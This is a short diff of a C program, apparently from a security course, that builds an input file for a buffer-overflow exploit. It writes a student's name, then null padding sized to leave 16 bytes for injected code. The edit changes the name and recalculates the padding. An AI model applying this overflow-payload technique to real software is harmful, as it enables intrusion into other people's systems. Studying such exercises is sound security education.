@@ -28,12 +28,13 @@ int main() {
         return 1;  /* Return error code if file opening fails */
     }
 
-    fprintf(psFile, "%s", "Claire Shin"); 
+    fprintf(psFile, "%s", "Shin Qian"); 
 
     /* add padding so that buffer overflow can be performed 
-    48 - 11 (length of name)= 37. 
-    Also have to leave 16 bytes for 4 lines of code */ 
-    for (i = 0; i < 21; i++) {
+    48 - 9 (length of name)= 39. 
+    Also have to leave 16 bytes for 4 lines of code.
+    39 - 16 = 23. */ 
+    for (i = 0; i < 23; i++) {
         fputc(0x00, psFile);
     }
 
